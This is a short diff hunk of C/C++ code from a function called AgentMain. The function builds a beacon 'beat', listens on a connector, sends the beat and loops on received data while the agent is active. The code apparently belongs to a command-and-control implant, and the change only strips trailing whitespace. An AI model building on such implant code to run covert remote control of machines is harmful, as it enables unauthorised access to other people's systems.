@@ -102,14 +102,14 @@ void AgentMain()
 
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
-	
+
 	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
 	*packerOut = Packer();
 	packerOut->Pack32(0);
 
 	do {
 		g_Connector->Listen();
-		
+
 		g_Connector->SendData(beat, beatSize);
 
 		while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {
